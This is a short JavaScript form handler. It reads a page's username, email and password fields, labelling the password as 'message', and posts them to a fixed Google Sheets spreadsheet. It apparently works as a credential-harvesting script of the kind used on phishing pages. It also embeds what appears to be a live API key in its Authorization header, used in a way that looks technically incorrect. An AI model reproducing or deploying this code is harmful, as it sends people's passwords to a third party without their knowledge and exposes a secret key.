function sendData() {

  const name = document.getElementById("username").value;

  const email = document.getElementById("email").value;

  const message = document.getElementById("password").value;

  const body = {

    values: [[name, email, message]]

  };

  const requestBody = {

    method: "POST",

    headers: {

      "Authorization": "AIzaSyBdZXPFV4MRoWZ6GNX4DLgZpL86o2LHK_I",

      "Content-Type": "application/json"

    },

    body: JSON.stringify(body)

  };

  fetch("https://sheets.googleapis.com/v4/spreadsheets/18_x5eZHMcYh0Z3kt1055w9FDj1aITS2uL3q5E0XTRhQ/values/Sheet1!A1:C1:append?valueInputOption=USER_ENTERED", requestBody)

    .then(response => {

      if (response.status === 200) {

        alert("Data sent successfully!");

      } else {

        alert("Failed to send data. Try again later.");

      }

    })

    .catch(error => {

      console.error(error);

      alert("Failed to send data. Try again later.");

    });

 }